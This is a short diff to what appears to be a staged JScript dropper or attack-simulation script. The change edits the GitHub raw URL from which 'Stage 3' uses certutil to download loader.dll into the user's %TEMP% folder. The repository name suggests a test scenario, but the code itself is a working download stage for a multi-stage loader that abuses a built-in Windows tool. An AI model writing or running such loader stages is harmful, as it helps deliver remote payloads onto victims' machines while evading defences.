@@ -50,7 +50,7 @@ try {
 }
 
 // Stage 3: certutil download loader.dll to %TEMP%
-var scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main";
+var scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main/src";
 var loaderDll = shell.ExpandEnvironmentStrings("%TEMP%") + "\\loader.dll";
 log("[*] Downloading loader.dll via certutil -> " + loaderDll);
 try {
